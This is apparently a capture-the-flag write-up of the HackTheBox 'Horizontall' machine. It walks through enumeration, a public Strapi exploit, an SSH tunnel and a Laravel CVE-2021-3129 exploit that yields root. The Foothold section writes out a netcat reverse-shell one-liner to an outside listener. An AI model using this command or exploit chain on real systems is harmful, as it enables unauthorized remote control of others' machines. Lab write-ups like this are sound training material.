---
title: "HackTheBox - Horizontall"
author: Nasrallah
description: ""
date: 2023-01-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, rce, tunneling, cve]
img_path: /assets/img/hackthebox/machines/horizontall
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing **Horizontall** from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.105
Host is up (0.66s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We found two open ports, 22 running ssh and 80 running nginx web server

## Web
 
From the nmap scan we see that the web server redirects to `horizontall.htb`, so let's add that to /etc/hosts and then navigate to the web page.

![](1.png)

Noting really useful in this page.

### Sub-domain

Let's enumerate for subdomains using `ffuf`.

```terminal
└──╼ $ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb/ -H "Host: FUZZ.horizontall.htb" -fw 7 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 7
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2, Duration: 199ms]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 162ms]

```

We found `api-prod` subdomain, let's add it to /etc/hosts.

![](2.png)

Also nothing in this page.

Let's check the headers and see if it reveals anything.

![](4.png)

We see the website is powered by `Strapi CMS`.

A quick search on exploit-db we see that it has some serious vulnerability.

![](3.png)

# **Foothold**

Let's download this [exploit](https://www.exploit-db.com/exploits/50239) and run it.

![](5.png)

Great! We got a new password for admin, let's login.

![](6.png)

Besides the new password, we also got a prompt for executing command on the target, unfortunately this is a blid RCE and we won't a get an output.

We can setup a listener on our machine and run the following command to get a reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.90 1234 >/tmp/f
```

![](7.png)

![](8.png)

# **Privilege Escalation**

By checking the /etc/passwd file, we see that user strapi which is the current user we have has a shell, so i copied my ssh public key to a newly created .ssh directory and ssh'ed to the machine.

Now we check the application's files.

![](9.png)

We managed to find a password for mysql but that leads to nothing.

Now let's list listening ports with `netstat -tulpn`

![](13.png)

port 80 and 22 we found earlier with nmap, 3306 is the mysql server, port 1337 is used by strapi, so we're left with port 8000.

Assuming it's running a web server, i used `curl` to send a get request and it was a web page.

## Tunneling

Using ssh tunneling, let's make a local port forward so that we can access the webpage from our local machine.

```bash
ssh -L 8000:localhost:8000 strapi@10.10.11.105 -i ~/CTF/www/id_rsa
```

Now let's navigate to the web page at localhost:8000

![](10.png)

The website is using Laravel version 8 which after some research we find it is vulnerable to command execution.

I found this [exploit](https://github.com/nth347/CVE-2021-3129_exploit) that worked well for me. Let's download it and use it.

![](11.png)

We got code execution as root.

The next command we're gonna use will give bash suid bit which allows us to easily get a root shell.

![](12.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).